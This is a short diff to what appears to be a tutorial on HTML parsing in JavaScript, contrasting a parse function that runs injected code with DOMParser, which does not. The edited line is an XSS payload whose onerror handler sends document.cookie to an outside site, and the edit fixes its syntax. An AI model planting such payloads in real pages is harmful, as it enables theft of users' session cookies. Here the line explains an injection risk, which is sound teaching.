@@ -177,7 +177,7 @@ const parse = (str) => {
 ```
 
 In fact, this function, having received a special payload, will RUN it. The following payload will send a network request:
-`<img/src/onerror="fetch('www.site.com?q='+encodeURI(document.cookie)">`
+`<img/src/onerror="fetch('www.site.com?q='+encodeURI(document.cookie))">`
 
 And in the case of using DOMParser, the code does not run.
 
